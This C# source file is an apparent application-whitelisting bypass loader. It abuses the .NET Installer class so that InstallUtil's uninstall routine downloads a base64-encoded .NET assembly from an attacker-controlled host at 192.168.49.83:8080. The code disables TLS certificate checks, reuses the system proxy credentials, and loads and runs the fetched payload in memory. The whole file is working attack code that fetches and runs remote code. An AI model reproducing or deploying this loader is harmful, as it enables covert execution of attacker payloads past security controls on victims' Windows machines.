using System;
using System.Configuration.Install;
using System.IO;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Net;
using System.Reflection;

// Need to:
// 1. References > Add > Assemblies > System.Configuration.Install
// 2. References > Browse > c:\windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll

namespace UninstallerBypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Likes initialization...");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            byte[] bytes = GetShellcode("http://192.168.49.83:8080/main");

            var assembly = Assembly.Load(bytes);
            MethodInfo method = assembly.EntryPoint;
            if (method != null)
            {
                method.Invoke(null, new object[] { new string[] { } });
            }
        }
        public static byte[] GetShellcode(string url)
        {
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
            WebClient client = new WebClient();
            // what be the user agent? 
            // Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36");
            client.Proxy = WebRequest.GetSystemWebProxy();
            client.Proxy.Credentials = CredentialCache.DefaultCredentials;
            string compressedEncodedShellcode = client.DownloadString(url);
            return Convert.FromBase64String(compressedEncodedShellcode);
        }
    }
}